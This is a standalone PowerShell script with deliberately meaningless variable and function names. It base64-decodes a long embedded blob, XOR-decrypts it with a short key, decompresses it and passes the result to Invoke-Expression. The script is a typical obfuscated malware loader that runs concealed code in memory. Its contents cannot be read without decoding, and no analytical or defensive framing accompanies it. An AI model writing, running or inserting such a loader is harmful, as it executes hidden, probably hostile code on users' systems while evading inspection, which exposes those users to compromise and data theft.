$2in4j3t5r = [System.Text.Encoding]::ascii
function 7g8hdj40tunm  {param($9sgw5ribc )
  $exs39ruom = [System.Convert]::FromBase64String($9sgw5ribc)
  $ufq3x42r9= $2in4j3t5r.GetBytes("739i4")
    $4qu7m3bla = $exs39ruom
    $fuoblj56w = $(for ($y5u9xm7t3 = 0; $y5u9xm7t3 -lt $4qu7m3bla.length; ) {
        for ($qb8kxz9pf = 0; $qb8kxz9pf -lt $ufq3x42r9.length; $qb8kxz9pf++) {
            $4qu7m3bla[$y5u9xm7t3] -bxor $ufq3x42r9[$qb8kxz9pf]
            $y5u9xm7t3++
            if ($y5u9xm7t3 -ge $4qu7m3bla.Length) {
                $qb8kxz9pf = $ufq3x42r9.length
            }
        }
    })
	$2fpsryan5 = New-Object System.IO.MemoryStream( , $fuoblj56w )

	    $sj8eldxkg = New-Object System.IO.MemoryStream
        $rnlbdyps5 = New-Object System.IO.Compression.GzipStream $2fpsryan5, ([IO.Compression.CompressionMode]::Decompress)
	    $rnlbdyps5.CopyTo( $sj8eldxkg )
        $rnlbdyps5.Close()
		$2fpsryan5.Close()
		[byte[]] $d1g9jsuv3 = $sj8eldxkg.ToArray()
 $v0os8nct4=$d1g9jsuv3
    return $v0os8nct4
}
[System.Text.Encoding]::ascii.GetString((7g8hdj40tunm "KLgxaTQ3MzltNKJnVAbvASPHVTXNPD3OFcVvUAfY4Ua7FUQLFkjegFnRzKrol5MdM1YaojMsEUUBxp6qaR5eceR+s5mK6QrE5XJBerRO9EV4Avj4PPVe2eckTeUMbXt1F7Akt9HaSUsHJox7L3hiG8U3kQBhKw1Vd+MgM+lZYHwKT35AXFLoJA3aqOn+OnBU8tt4k6eDvZUfj1pxsDmevo82PTIXhDV8f4lwy1BdOnWxQlyxBX9yiXM17hNgE1FQDnrItnk8fyNl995NkVh0jKAqgGQe3V9fKpqSWCs85IFL0+W4wnWv/xn+JXcr3zN8/0fCT6/TwmFk1VtDs1OGIpp3PQ+VD2mIHd2Sd0geu0jOtBJIqR2CLlQcrnFBeGm91IroDHlS+ESG3huzGwS+OTnjWTYYw/WOzIDDOAZcNg/uNo3y6agWjhaFHhKCgIl/1ekTgyDY5jQNYd5IzsoICQzkf+ry1z5monrn697tfQa1qg58LOAWakiXfemAsehcdyXdlqZ4U04q5RfkL92qtVrwTrt3SlebKApNbvEGkrrPj/3zF8y66ZxCMDHZPeF/XTWVQDu3FnX4GBZNxvnLg4KVhTv/UxUdd16xlMvSvU29eCfAO7HwiS8GSDE+F+RKHd6E4WWZC7CA7eZQETtB4wyLAHq4R3S7bAtjsig1ZjqOHZogbEfcp8NG0HMFMkJzxRJ1LOImGPa2wzi2lGYZS1cnXh+CZFH0zG3sfGIud3zocUvZmT1bGQJlh/Q8XXLhVCsMgNS+lc+xn2uEy4hSogTWej7NsIZv/F57+HHlp/8HgHKLJ+vNcIssi3DlB7zX7SAfmwCd9pSD306WzqJMXwezYBhGErqe/9ZAFZDOsOupLKhjn/0nnjQ3znWaML1TKICx27IPMFTMBJFu3iGA6/2zctLSqp4k8NrLztfl0GWacbs/WeX6brS2h/rCzKxUi8sNMQ4A4PLCnaDPCHQNYOD4jBhHpe62ysVVtr7H/CgeECv5DLq3QaH91YPoxlX4D4gPxGW16oyJ/4CXAjQbYh0liwHeWRgTF53WNMM5514qOMfc2Xrox35QVhCd2yYeDxGOS23eN88wjCcX03b0mbRTCWP4tRreoL3maP2+f2mpMjcz"))|iex;